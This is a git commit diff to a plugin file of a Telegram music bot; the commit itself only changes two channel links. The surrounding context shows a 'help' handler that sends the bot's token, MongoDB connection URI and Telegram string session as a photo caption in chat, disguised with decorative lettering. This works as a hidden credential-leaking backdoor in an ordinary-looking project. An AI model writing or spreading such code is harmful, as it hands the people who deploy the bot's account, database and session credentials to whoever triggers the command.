3ffa60b4407ee90dec0e6527b3b8e97df4865235
iamnobita206243 <nobitamusic001@gmail.com>
2026-05-09 17:15:34 +0530

    Update reload.py

--- NobitaMusic/plugins/tools/reload.py
+++ NobitaMusic/plugins/tools/reload.py
@@ -113,12 +113,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_NOBITA_DEFAULTERS_ll)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/II_NOBITA_DEFAULTERS_II)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• 𝚴 𝐎 𝐁 𝚰 𝐓 𝚲 •", url=f"https://t.me/II_YOUR_NOBITA_II")
+                         "• 𝚴 𝐎 𝐁 𝚰 𝐓 𝚲 •", url=f"https://t.me/II_NOBITA_DEFAULTERS_II")
                  ]
             ]
          ),
